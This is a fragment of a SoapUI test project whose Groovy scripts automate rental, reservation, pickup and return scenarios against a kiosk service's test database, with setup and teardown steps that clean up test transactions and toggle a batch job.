tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [GCAuthorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="dcf719ec-673c-4e30-8d66-40e655fd3ee6"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3, BillingTypeID = 6 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="groovy" name="ResvAuth" id="17550037-60a4-4ad4-8d71-9a7a1f135411"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ResvAuth"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
//tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));
tc.setPropertyValue("recoFormats", context.expand( '${DataSource#recoFormats}' ));
tc.setPropertyValue("numOfRecos", context.expand( '${DataSource#numOfRecos}' ));
tc.setPropertyValue('ModifiedCart', 'true');

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
tc.setPropertyValue("Email", authtc.getPropertyValue("Email"));
tc.setPropertyValue("KioskID", authtc.getPropertyValue("KioskID"));
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("AppliedPromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [ResvAuth] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ResvAuth $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ResvAuth $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="ModResvPickup" id="4043506e-3d76-4ead-a4a5-c3d6741a70a4"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );

//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ModResvPickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("UseCredits", '0');

tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RecoVendStatus}' ) + "," + context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ResvAuth"];
tc.setPropertyValue("Email", authtc.getPropertyValue("Email"));
tc.setPropertyValue("KioskID", authtc.getPropertyValue("KioskID"));
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("ItemSourceType", authtc.getPropertyValue("ItemSourceType"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
//tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("ModifiedCart", "true");


if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [ModResvPickup] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAILED")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ModResvPickup $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ModResvPickup $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="124dde82-e9c9-41ed-8f9a-b761d8c2158d"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ModResvPickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
	//	assert runner.status != Status.FAILED : runner.reason
	
		if(tcStatus == "FAILED")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="7826ec17-1dd0-4255-b5ff-2bb6668ec994"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="337fc103-c3fc-41c2-a632-6608cd265304"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505");

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");
def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1823107</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2148884835</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">75527813105188</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>GCAuthorize PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>34</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>08/03/18-14:25:12.514</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>08/03/18-14:26:11.479</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5584386</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>12</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><